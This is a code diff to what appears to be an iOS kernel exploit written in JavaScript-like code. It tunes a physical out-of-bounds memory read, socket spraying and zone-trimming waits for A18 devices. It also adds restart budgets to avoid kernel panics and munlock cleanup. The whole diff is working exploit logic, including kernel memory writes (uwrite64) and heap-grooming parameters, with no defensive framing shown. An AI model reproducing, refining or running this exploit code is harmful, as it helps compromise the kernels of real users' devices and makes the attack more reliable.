@@ -1322,6 +1322,10 @@
       uwrite64(wired_address + 0x8n, wired_address);
     }
     let target_inp_gencnt_list = [];
+    const zone_trim_sleep_seconds = is_a18_devices ? 35n : 20n;
+    const post_trim_restart_offset = is_a18_devices ? 0x150000n : 0xffffffffffffffffn;
+    const max_mapping_restarts = is_a18_devices ? 4 : 0;
+    let mapping_restart_count = 0;
     LOG("[i] Allocating memory done");
     while (true) {
       let search_mapping_size = 0x800n * PAGE_SIZE;
@@ -1345,12 +1349,19 @@
       socket_ports = [];
       socket_pcb_ids = [];
       socket_ports_count = 0n;
-      let max_sockets_count = 0x5800n;
-      let split_count = 8n;
+      let max_sockets_count = is_a18_devices ? 0x5000n : 0x5800n;
+      let split_count = is_a18_devices ? 10n : 8n;
       let wired_pages = [];
       let success = false;
+      let restart_mapping = false;
+      let zone_trimmed = false;
       let seeking_offset = 0n;
       while (seeking_offset < search_mapping_size) {
+        if (zone_trimmed && seeking_offset >= post_trim_restart_offset) {
+          restart_mapping = true;
+          LOG("[+] post-trim search budget reached at offset " + seeking_offset.hex() + "; restarting mapping");
+          break;
+        }
         kr = physical_oob_read_mo(memory_object, seeking_offset, oob_size, oob_offset, read_buffer);
         if (kr != KERN_SUCCESS) {
           seeking_offset += PAGE_SIZE;
@@ -1390,8 +1401,9 @@
           } else {
             if (socket_ports_count >= max_sockets_count) {
               sockets_release();
-              LOG("[+] waiting for zone trimming...");
-              sleep(20n);
+              zone_trimmed = true;
+              LOG("[+] waiting for zone trimming... sleep=" + zone_trim_sleep_seconds.toString() + " sockets=" + max_sockets_count.hex() + " split=" + split_count.hex());
+              sleep(zone_trim_sleep_seconds);
             }
             seeking_offset = 0n;
           }
@@ -1409,13 +1421,23 @@
         exit(0n);
       }
       sockets_release();
+      surface_munlock(search_mapping_address, search_mapping_size);
       kr = mach_vm_deallocate(mach_task_self(), search_mapping_address, search_mapping_size);
       if (success == true) {
         break;
       }
+      if (restart_mapping) {
+        mapping_restart_count++;
+        LOG("[+] restarted PE search mapping count=" + mapping_restart_count + " max=" + max_mapping_restarts);
+        if (max_mapping_restarts && mapping_restart_count >= max_mapping_restarts) {
+          LOG("[-] PE search mapping restart budget exhausted; exiting to avoid panic-prone long scan");
+          exit(0n);
+        }
+      }
     }
     for (let i = 0n; i < BigInt(wired_mapping_entries_addresses.length); i++) {
       let wired_page = wired_mapping_entries_addresses[i];
+      surface_munlock(wired_page, wired_mapping_entry_size);
       mach_vm_deallocate(mach_task_self(), wired_page, wired_mapping_entry_size);
     }
   }
